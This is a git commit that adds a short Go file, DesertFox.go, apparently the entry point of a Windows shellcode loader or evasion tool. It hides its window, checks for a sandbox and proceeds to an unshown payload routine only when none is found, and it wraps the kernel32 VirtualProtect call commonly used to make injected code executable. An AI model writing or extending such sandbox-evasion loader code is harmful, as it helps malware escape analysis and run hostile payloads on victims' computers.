cf58bc31980bab6f8f703c00f525585175fcdcaa
赵公子 <zha0gongz1@protonmail.com>
2022-05-07 19:23:07 +0800

    Add files via upload

---
+++ DesertFox.go
@@ -0,0 +1,32 @@
+package main
+
+import (
+	"fmt"
+	"unsafe"
+	"golang.org/x/function" //"src/DesertFox/function"
+	"syscall"
+)
+
+var (
+	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
+)
+
+func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	ret, _, _ := procVirtualProtect.Call(
+		uintptr(lpAddress),
+		uintptr(dwSize),
+		uintptr(flNewProtect),
+		uintptr(lpflOldProtect))
+	return ret > 0
+}
+
+func main() {
+	function.HideWindow()
+	Sb := function.CheckSandbox()
+	if len(Sb) == 0 {
+		function.Proceed()
+	} else {
+		fmt.Println(Sb)
+	}
+}
